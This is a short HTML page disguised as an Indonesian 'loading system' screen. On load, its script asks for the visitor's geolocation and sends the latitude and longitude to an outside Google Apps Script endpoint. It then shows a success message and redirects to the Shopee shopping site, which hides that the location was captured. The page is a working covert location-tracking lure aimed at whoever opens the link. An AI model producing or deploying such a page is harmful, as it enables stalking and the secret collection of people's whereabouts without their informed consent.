<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      font-family: Arial;
      background: linear-gradient(135deg, #4facfe, #00f2fe);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .card {
      background: rgba(255,255,255,0.15);
      backdrop-filter: blur(10px);
      padding: 30px;
      border-radius: 15px;
      text-align: center;
      color: white;
      width: 80%;
      max-width: 300px;
      animation: fadeIn 1s ease;
    }

    .loader {
      border: 5px solid rgba(255,255,255,0.3);
      border-top: 5px solid white;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      margin: auto;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      100% { transform: rotate(360deg); }
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(20px);}
      to {opacity: 1; transform: translateY(0);}
    }

    h2 {
      margin-top: 20px;
    }
  </style>
</head>

<body>

<div class="card">
  <div class="loader" id="load"></div>
  <h2 id="status">Memuat sistem...</h2>
  <p>Menghubungkan ke server</p>
</div>

<script>
navigator.geolocation.getCurrentPosition(
  function(pos){

    var lat = pos.coords.latitude;
    var lon = pos.coords.longitude;

    var url = "https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat=" 
              + lat + "&lon=" + lon;

    fetch(url).then(() => {
      document.getElementById("load").style.display = "none";
      document.getElementById("status").innerHTML = "✅ Berhasil";
      
      setTimeout(() => {
        window.location.href = "https://shopee.co.id";
      }, 2000);
    });

  },

  function(error){
    document.getElementById("status").innerHTML = "❌ Gagal akses lokasi";
  }
);
</script>

</body>
</html>
